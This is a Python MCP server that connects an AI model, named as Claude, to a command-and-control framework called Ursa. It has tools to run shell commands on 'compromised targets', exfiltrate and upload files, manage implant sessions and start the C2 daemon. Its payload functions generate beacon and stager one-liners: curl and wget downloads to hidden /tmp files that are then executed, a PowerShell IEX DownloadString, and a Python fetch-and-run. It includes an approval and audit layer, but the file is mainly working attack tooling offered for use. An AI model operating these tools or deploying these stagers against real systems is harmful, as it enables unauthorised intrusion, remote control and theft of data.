#!/usr/bin/env python3
"""
Ursa — C2 Operator MCP Server
================================
Claude's interface to the Ursa Major C2 framework.

Lets Claude manage sessions, issue tasks, track results, generate
payloads, and control the C2 — all from conversation.

Tools:
    Sessions:
        - ursa_sessions      — List all active/stale/dead sessions
        - ursa_session_info  — Get detailed info on a session
        - ursa_kill_session  — Kill a session

    Tasking:
        - ursa_shell         — Run a shell command on a target
        - ursa_task          — Send any task type to a session
        - ursa_task_result   — Check a task's result
        - ursa_tasks         — List tasks for a session

    Files:
        - ursa_download      — Download a file from a target
        - ursa_upload        — Upload a file to a target
        - ursa_files         — List exfiltrated files

    C2 Management:
        - ursa_start_c2      — Start the C2 server daemon
        - ursa_stop_c2       — Stop the C2 server
        - ursa_c2_status     — Check if C2 is running
        - ursa_events        — View C2 event log

    Payload Generation:
        - ursa_generate      — Generate a beacon payload
        - ursa_stager        — Generate a stager one-liner

Run with:
    /path/to/ursa/venv/bin/python3 server.py
"""

import sys
import os
import json
import time
import signal
import subprocess
import base64
from datetime import datetime
from pathlib import Path

from mcp.server.fastmcp import FastMCP

# Add project root to path
PROJECT_ROOT = Path(__file__).parent
sys.path.insert(0, str(PROJECT_ROOT))

from major.db import (
    get_session, list_sessions, kill_session, get_task, list_tasks,
    list_files, get_events,
    get_approval_request, list_approval_requests, resolve_approval_request,
    append_immutable_audit_event, get_immutable_audit, verify_immutable_audit_chain,
)
from major.governance import (
    queue_task_with_policy,
    format_risk_matrix,
    normalize_args_string,
)

mcp_server = FastMCP(
    "ursa",
    instructions="""Ursa — Command & Control operator interface.
    You have tools to manage implant sessions, issue commands to compromised
    targets, track results, generate payloads, and control the C2 server.
    The C2 server (Ursa Major) must be running for session management to work.
    Use ursa_start_c2 to launch it if needed.""",
)

VENV_PYTHON = str(PROJECT_ROOT / "venv" / "bin" / "python3")
C2_PID_FILE = str(PROJECT_ROOT / "major" / ".c2.pid")


def _format_time(ts):
    """Format a Unix timestamp to human-readable."""
    if not ts:
        return "never"
    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


def _time_ago(ts):
    """Human-readable time since timestamp."""
    if not ts:
        return "never"
    diff = time.time() - ts
    if diff < 60:
        return f"{int(diff)}s ago"
    elif diff < 3600:
        return f"{int(diff/60)}m ago"
    elif diff < 86400:
        return f"{int(diff/3600)}h ago"
    else:
        return f"{int(diff/86400)}d ago"


# ── C2 Management ──


@mcp_server.tool()
def ursa_start_c2(port: int = 8443, host: str = "0.0.0.0") -> str:
    """
    Start the Ursa Major C2 server as a background daemon.

    Args:
        port: Port to listen on (default 8443)
        host: Bind address (default 0.0.0.0)
    """
    # Check if already running
    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)  # Check if process exists
            return f"Ursa Major is already running (PID {pid}) on port {port}"
        except (ProcessLookupError, ValueError):
            os.unlink(C2_PID_FILE)

    # Start C2 server
    proc = subprocess.Popen(
        [VENV_PYTHON, str(PROJECT_ROOT / "major" / "server.py"), "--port", str(port), "--host", host],
        cwd=str(PROJECT_ROOT),
        stdout=open(str(PROJECT_ROOT / "major" / "c2.log"), "a"),
        stderr=subprocess.STDOUT,
        start_new_session=True,
    )

    with open(C2_PID_FILE, "w") as f:
        f.write(str(proc.pid))

    time.sleep(1)

    if proc.poll() is None:
        return f"Ursa Major C2 started on {host}:{port} (PID {proc.pid})"
    else:
        return "Failed to start C2 server. Check major/c2.log for errors."


@mcp_server.tool()
def ursa_stop_c2() -> str:
    """Stop the Ursa Major C2 server."""
    if not os.path.exists(C2_PID_FILE):
        return "Ursa Major is not running (no PID file)"

    try:
        with open(C2_PID_FILE) as f:
            pid = int(f.read().strip())
        os.kill(pid, signal.SIGTERM)
        os.unlink(C2_PID_FILE)
        return f"Ursa Major stopped (PID {pid})"
    except ProcessLookupError:
        os.unlink(C2_PID_FILE)
        return "Ursa Major was not running (stale PID file removed)"
    except Exception as e:
        return f"Error stopping C2: {e}"


@mcp_server.tool()
def ursa_c2_status() -> str:
    """Check if the Ursa Major C2 server is running and show stats."""
    running = False
    pid = None

    if os.path.exists(C2_PID_FILE):
        try:
            with open(C2_PID_FILE) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            running = True
        except (ProcessLookupError, ValueError):
            pass

    sessions = list_sessions()
    active = [s for s in sessions if s["status"] == "active"]
    stale = [s for s in sessions if s["status"] == "stale"]
    dead = [s for s in sessions if s["status"] == "dead"]

    lines = [
        "URSA MAJOR — STATUS",
        "=" * 40,
        f"Server:     {'RUNNING (PID ' + str(pid) + ')' if running else 'STOPPED'}",
        f"Sessions:   {len(active)} active, {len(stale)} stale, {len(dead)} dead",
        f"Total:      {len(sessions)}",
    ]

    if active:
        lines.append("")
        lines.append("Active Sessions:")
        for s in active:
            lines.append(f"  {s['id']}  {s['username']}@{s['hostname']}  "
                        f"({s['remote_ip']})  last: {_time_ago(s['last_seen'])}")

    return "\n".join(lines)


# ── Session Management ──


@mcp_server.tool()
def ursa_sessions(status: str | None = None) -> str:
    """
    List all implant sessions.

    Args:
        status: Filter by status — "active", "stale", or "dead".
                Shows all if not specified.
    """
    sessions = list_sessions(status=status)

    if not sessions:
        return f"No {'sessions' if not status else status + ' sessions'} found."

    lines = [
        f"{'ID':<10} {'User@Host':<30} {'IP':<18} {'OS':<20} {'Last Seen':<12} {'Status'}",
        "-" * 100,
    ]

    for s in sessions:
        user_host = f"{s['username']}@{s['hostname']}"
        lines.append(
            f"{s['id']:<10} {user_host:<30} {s['remote_ip']:<18} "
            f"{s['os'][:20]:<20} {_time_ago(s['last_seen']):<12} {s['status']}"
        )

    lines.append(f"\n{len(sessions)} sessions total")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_session_info(session_id: str) -> str:
    """
    Get detailed information about a specific session.

    Args:
        session_id: The session ID to look up
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    tasks = list_tasks(session_id=session_id, limit=10)
    files = list_files(session_id=session_id)

    lines = [
        f"SESSION: {s['id']}",
        "=" * 50,
        f"  Status:      {s['status']}",
        f"  Remote IP:   {s['remote_ip']}",
        f"  Hostname:    {s['hostname']}",
        f"  Username:    {s['username']}",
        f"  OS:          {s['os']}",
        f"  Arch:        {s['arch']}",
        f"  PID:         {s['pid']}",
        f"  Process:     {s['process_name']}",
        f"  First seen:  {_format_time(s['first_seen'])}",
        f"  Last seen:   {_format_time(s['last_seen'])} ({_time_ago(s['last_seen'])})",
        f"  Interval:    {s['beacon_interval']}s (jitter: {s['jitter']})",
        f"  Encrypted:   {'Yes' if s.get('encryption_key') else 'No'}",
    ]

    if tasks:
        lines.append(f"\n  Recent Tasks ({len(tasks)}):")
        for t in tasks:
            status_icon = {"completed": "✓", "error": "✗", "pending": "○", "in_progress": "◐"}.get(t["status"], "?")
            lines.append(f"    {status_icon} {t['id']}  {t['task_type']:<12}  {t['status']}")

    if files:
        lines.append(f"\n  Files ({len(files)}):")
        for f in files:
            lines.append(f"    {f['id']}  {f['filename']:<25}  {f['size']}B  {f['direction']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_kill_session(session_id: str) -> str:
    """
    Kill/deactivate a session.

    Args:
        session_id: The session ID to kill
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="kill",
        args={},
        actor="mcp:ursa_kill_session",
    )
    if decision["status"] == "approval_required":
        return (
            f"Kill action requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Use ursa_approve('{decision['approval_id']}') to proceed."
        )
    kill_session(session_id)
    return (
        f"Session {session_id} ({s['username']}@{s['hostname']}) killed.\n"
        f"Kill task queued: {decision['task_id']}"
    )


# ── Tasking ──


@mcp_server.tool()
def ursa_shell(session_id: str, command: str) -> str:
    """
    Execute a shell command on a target.

    The command is queued and will execute on the next beacon check-in.
    Use ursa_task_result to check the output.

    Args:
        session_id: Target session ID
        command: Shell command to execute
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."
    if s["status"] == "dead":
        return f"Session {session_id} is dead. Cannot issue tasks."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="shell",
        args={"command": command},
        actor="mcp:ursa_shell",
    )
    if decision["status"] == "approval_required":
        return (
            f"Shell task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"{decision['message']}"
        )
    task_id = decision["task_id"]
    return (f"Shell task queued: {task_id}\n"
            f"Target: {s['username']}@{s['hostname']}\n"
            f"Command: {command}\n"
            f"Will execute on next beacon (interval: {s['beacon_interval']}s)")


@mcp_server.tool()
def ursa_task(session_id: str, task_type: str, args: str = "{}") -> str:
    """
    Send any task type to a session.

    Task types: shell, sysinfo, download, upload, sleep, kill, ps,
                pwd, cd, ls, whoami, env

    Args:
        session_id: Target session ID
        task_type: The task type to send
        args: JSON string of arguments (e.g., '{"command": "whoami"}')
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    try:
        task_args = normalize_args_string(args)
    except ValueError as exc:
        return str(exc)

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type=task_type,
        args=task_args,
        actor="mcp:ursa_task",
    )
    if decision["status"] == "approval_required":
        return (
            f"Task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}"
        )
    task_id = decision["task_id"]
    return (f"Task queued: {task_id}\n"
            f"Type: {task_type}\n"
            f"Args: {json.dumps(task_args)}\n"
            f"Target: {s['username']}@{s['hostname']}")


@mcp_server.tool()
def ursa_task_result(task_id: str) -> str:
    """
    Check the result of a task.

    Args:
        task_id: The task ID to check
    """
    t = get_task(task_id)
    if not t:
        return f"Task {task_id} not found."

    lines = [
        f"TASK: {t['id']}",
        f"Type:      {t['task_type']}",
        f"Session:   {t['session_id']}",
        f"Status:    {t['status']}",
        f"Created:   {_format_time(t['created_at'])}",
    ]

    if t.get("picked_up_at"):
        lines.append(f"Picked up: {_format_time(t['picked_up_at'])}")
    if t.get("completed_at"):
        lines.append(f"Completed: {_format_time(t['completed_at'])}")

    if t["status"] == "pending":
        lines.append("\n(Waiting for implant to check in...)")
    elif t["status"] == "in_progress":
        lines.append("\n(Implant picked up task, waiting for result...)")
    elif t.get("result"):
        lines.append(f"\n--- Output ---\n{t['result']}")
    if t.get("error"):
        lines.append(f"\n--- Error ---\n{t['error']}")

    return "\n".join(lines)


@mcp_server.tool()
def ursa_tasks(session_id: str | None = None, status: str | None = None, limit: int = 20) -> str:
    """
    List tasks, optionally filtered by session and/or status.

    Args:
        session_id: Filter to a specific session
        status: Filter by status — "pending", "in_progress", "completed", "error"
        limit: Max tasks to return (default 20)
    """
    tasks = list_tasks(session_id=session_id, status=status, limit=limit)

    if not tasks:
        return "No tasks found."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Type':<12} {'Status':<12} {'Created'}",
        "-" * 65,
    ]

    for t in tasks:
        lines.append(
            f"{t['id']:<10} {t['session_id']:<10} {t['task_type']:<12} "
            f"{t['status']:<12} {_time_ago(t['created_at'])}"
        )

    return "\n".join(lines)


# ── File Operations ──


@mcp_server.tool()
def ursa_download(session_id: str, remote_path: str) -> str:
    """
    Download a file from a target (exfiltrate to C2).

    Queues a download task. The file will be available via ursa_files
    once the implant checks in and sends it.

    Args:
        session_id: Target session ID
        remote_path: Path on the target to download
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="download",
        args={"path": remote_path},
        actor="mcp:ursa_download",
    )
    if decision["status"] == "approval_required":
        return (
            f"Download task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    task_id = decision["task_id"]
    return (f"Download task queued: {task_id}\n"
            f"Target file: {remote_path}\n"
            f"Will transfer on next beacon check-in.")


@mcp_server.tool()
def ursa_upload(session_id: str, local_path: str, remote_path: str) -> str:
    """
    Upload a file to a target (deliver from C2).

    Args:
        session_id: Target session ID
        local_path: Local file path to upload
        remote_path: Destination path on the target
    """
    s = get_session(session_id)
    if not s:
        return f"Session {session_id} not found."

    local_path_expanded = os.path.expanduser(local_path)
    if not os.path.exists(local_path_expanded):
        return f"Local file not found: {local_path}"

    with open(local_path_expanded, "rb") as f:
        data = f.read()

    decision = queue_task_with_policy(
        session_id=session_id,
        task_type="upload",
        args={"path": remote_path, "data": base64.b64encode(data).decode()},
        actor="mcp:ursa_upload",
    )
    if decision["status"] == "approval_required":
        return (
            f"Upload task requires approval ({decision['risk_level']} risk).\n"
            f"Approval ID: {decision['approval_id']}"
        )
    task_id = decision["task_id"]
    return (f"Upload task queued: {task_id}\n"
            f"File: {local_path} ({len(data)} bytes) → {remote_path}")


@mcp_server.tool()
def ursa_files(session_id: str | None = None) -> str:
    """
    List files transferred to/from implants.

    Args:
        session_id: Filter to a specific session (optional)
    """
    files = list_files(session_id=session_id)

    if not files:
        return "No files stored."

    lines = [
        f"{'ID':<10} {'Session':<10} {'Filename':<30} {'Size':<10} {'Dir':<10} {'Time'}",
        "-" * 85,
    ]

    for f in files:
        lines.append(
            f"{f['id']:<10} {f['session_id']:<10} {f['filename']:<30} "
            f"{f['size']:<10} {f['direction']:<10} {_time_ago(f['created_at'])}"
        )

    return "\n".join(lines)


# ── Events ──


@mcp_server.tool()
def ursa_events(limit: int = 30, level: str | None = None) -> str:
    """
    View the C2 event log.

    Args:
        limit: Number of events to show (default 30)
        level: Filter by level — "info", "warning", "error"
    """
    events = get_events(limit=limit, level=level)

    if not events:
        return "No events."

    lines = []
    for e in events:
        ts = datetime.fromtimestamp(e["timestamp"]).strftime("%H:%M:%S")
        sid = f" [{e['session_id']}]" if e.get("session_id") else ""
        lines.append(f"[{ts}] {e['level'].upper():<7} {e['source']}{sid}: {e['message']}")

    return "\n".join(lines)


# ── Governance ──


@mcp_server.tool()
def ursa_policy_matrix() -> str:
    """Show the Ursa unified policy/risk matrix."""
    return "URSA POLICY MATRIX\n==================\n" + format_risk_matrix()


@mcp_server.tool()
def ursa_approvals(status: str = "pending", limit: int = 20) -> str:
    """
    List governance step-up approval requests.

    Args:
        status: Filter by status ("pending", "approved", "rejected")
        limit: Max rows to return
    """
    rows = list_approval_requests(status=status, limit=limit)
    if not rows:
        return f"No {status} approvals."

    lines = [
        f"{'ID':<10} {'Risk':<10} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
        "-" * 85,
    ]
    for row in rows:
        lines.append(
            f"{row['id']:<10} {row['risk_level']:<10} {row['action']:<12} "
            f"{(row.get('session_id') or '-'): <10} {row['requested_by']:<20} "
            f"{_time_ago(row['created_at'])}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_approve(approval_id: str, note: str = "") -> str:
    """
    Approve a pending request and queue its original task.

    Args:
        approval_id: Approval request ID
        note: Optional decision note
    """
    req = get_approval_request(approval_id)
    if not req:
        return f"Approval {approval_id} not found."
    if req["status"] != "pending":
        return f"Approval {approval_id} is already {req['status']}."

    if not resolve_approval_request(approval_id, approved=True, decided_by="mcp:operator", note=note):
        return f"Approval {approval_id} could not be updated."

    args = json.loads(req.get("args") or "{}")
    decision = queue_task_with_policy(
        session_id=req["session_id"],
        task_type=req.get("task_type") or "shell",
        args=args,
        actor="mcp:ursa_approve",
        approval_id=approval_id,
    )
    append_immutable_audit_event(
        actor="mcp:ursa_approve",
        action="approval_decision",
        session_id=req.get("session_id"),
        approval_id=approval_id,
        risk_level=req.get("risk_level", "unknown"),
        policy_result="approved",
        details={"note": note},
    )
    if decision["status"] != "queued":
        return f"Approval {approval_id} recorded, but task was not queued: {decision['message']}"
    return f"Approval {approval_id} approved. Task queued: {decision['task_id']}"


@mcp_server.tool()
def ursa_reject(approval_id: str, note: str = "") -> str:
    """
    Reject a pending approval request.

    Args:
        approval_id: Approval request ID
        note: Optional reason for rejection
    """
    req = get_approval_request(approval_id)
    if not req:
        return f"Approval {approval_id} not found."
    if req["status"] != "pending":
        return f"Approval {approval_id} is already {req['status']}."

    if not resolve_approval_request(approval_id, approved=False, decided_by="mcp:operator", note=note):
        return f"Approval {approval_id} could not be updated."
    append_immutable_audit_event(
        actor="mcp:ursa_reject",
        action="approval_decision",
        session_id=req.get("session_id"),
        approval_id=approval_id,
        risk_level=req.get("risk_level", "unknown"),
        policy_result="rejected",
        details={"note": note},
    )
    return f"Approval {approval_id} rejected."


@mcp_server.tool()
def ursa_audit_integrity(limit: int = 50) -> str:
    """
    Verify immutable audit chain integrity and show recent audit events.

    Args:
        limit: Number of recent events to show after verification
    """
    check = verify_immutable_audit_chain()
    rows = get_immutable_audit(limit=limit)
    status_line = (
        f"Audit chain integrity: OK ({check['checked']} events checked)"
        if check["ok"]
        else f"Audit chain integrity: FAILED at {check['failed_event']} after {check['checked']} checks"
    )
    if not rows:
        return status_line + "\nNo immutable audit events."
    lines = [status_line, "", "Recent immutable events:"]
    for row in rows[: min(limit, 20)]:
        lines.append(
            f"[{_format_time(row['timestamp'])}] {row['actor']} {row['action']} "
            f"risk={row['risk_level']} result={row['policy_result']}"
        )
    return "\n".join(lines)


# ── Payload Generation ──


@mcp_server.tool()
def ursa_generate(
    c2_url: str | None = None,
    interval: int = 5,
    jitter: float = 0.1,
    output_format: str = "python",
) -> str:
    """
    Generate a beacon payload configured for your C2 server.

    Args:
        c2_url: The C2 server URL (e.g., http://10.0.0.1:8443).
                Auto-detects if not provided.
        interval: Beacon interval in seconds (default 5)
        jitter: Jitter factor 0.0-1.0 (default 0.1)
        output_format: Output format — "python" for full script,
                       "oneliner" for a one-line command
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:8443"

    if output_format == "oneliner":
        return (f"python3 -c \"$(curl -s {c2_url}/stage)\" "
                f"--server {c2_url} --interval {interval} --jitter {jitter}")

    # Read the beacon source
    beacon_path = PROJECT_ROOT / "implants" / "beacon.py"
    if not beacon_path.exists():
        return "Beacon source not found at implants/beacon.py"

    with open(beacon_path) as f:
        beacon_src = f.read()

    lines = [
        f"Ursa Beacon Payload Generated",
        f"C2:       {c2_url}",
        f"Interval: {interval}s",
        f"Jitter:   {jitter}",
        "",
        f"Deploy command:",
        f"  python3 beacon.py --server {c2_url} --interval {interval} --jitter {jitter}",
        "",
        f"One-liner (curl + exec):",
        f"  curl -s {c2_url}/stage | python3 - --server {c2_url}",
        "",
        f"Beacon source is at: {beacon_path}",
        f"Copy it to the target and run with the deploy command above.",
    ]

    return "\n".join(lines)


@mcp_server.tool()
def ursa_stager(c2_url: str | None = None) -> str:
    """
    Generate stager one-liners for different platforms.

    The stager downloads and runs the full beacon from the C2 /stage endpoint.

    Args:
        c2_url: C2 server URL. Auto-detects if not set.
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:8443"

    lines = [
        f"URSA STAGER ONE-LINERS → {c2_url}",
        "",
        "[Python — cross-platform]",
        f"python3 -c \"import urllib.request,os,tempfile,subprocess;"
        f"d=urllib.request.urlopen('{c2_url}/stage').read();"
        f"f=tempfile.NamedTemporaryFile(suffix='.py',delete=False);"
        f"f.write(d);f.close();"
        f"subprocess.Popen(['python3',f.name,'--server','{c2_url}'])\"",
        "",
        "[Bash + curl]",
        f"curl -s {c2_url}/stage -o /tmp/.u.py && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "[PowerShell]",
        f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('{c2_url}/stage')\"",
        "",
        "[wget]",
        f"wget -qO /tmp/.u.py {c2_url}/stage && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "NOTE: Ensure the C2 server is running (ursa_start_c2) before deploying.",
    ]

    return "\n".join(lines)


if __name__ == "__main__":
    mcp_server.run()
